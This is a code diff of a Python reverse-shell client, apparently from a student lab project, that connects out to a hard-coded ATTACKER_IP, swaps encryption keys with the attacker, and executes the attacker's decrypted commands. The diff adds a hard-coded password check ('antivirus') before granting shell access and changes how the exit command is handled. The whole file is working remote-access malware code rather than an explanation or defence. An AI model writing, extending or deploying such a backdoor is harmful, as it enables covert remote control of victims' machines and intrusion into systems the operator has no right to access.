@@ -1,9 +1,11 @@
-# pylint: disable=bare-except, missing-docstring, import-error
+# pylint: disable=bare-except, missing-docstring, import-error, invalid-name, line-too-long
 import socket
 import subprocess
 import os
+import sys
 from cryptidy import asymmetric_encryption as ae
 
+PASSWORD = 'antivirus'
 EOF = b'dhruv.anish.samarth.blah.blah'
 
 ATTACKER_IP = '10.0.2.4' # Change this if your attacker machine's IP is different
@@ -18,14 +20,25 @@ s.send(pub_key.encode())
 # receive the attacker's public key
 attacker_pub_key = s.recv(1024).decode()
 
+# recv the encrypted password, and it should match ours
+encrypted_password = s.recv(1024)
+_, unencryped_password = ae.decrypt_message(encrypted_password, priv_key)
+
+if unencryped_password != PASSWORD:
+    s.send('could not verify identity, closing connection\n'.encode())
+    s.close()
+    sys.exit(0)
+
+# login was valid, continuing to shell access
 try:
     while True:
         encrypted_command = s.recv(1024)
-        _, attacker_input = ae.decrypt_message(encrypted_command, priv_key)
-        attacker_input = attacker_input.split(' ')
-        if attacker_input == 'exit':
+        if encrypted_command.decode() == 'exit':
             s.close()
             break
+
+        _, attacker_input = ae.decrypt_message(encrypted_command, priv_key)
+        attacker_input = attacker_input.split(' ')
 
         if len(attacker_input) == 0:
             s.send(b' ')
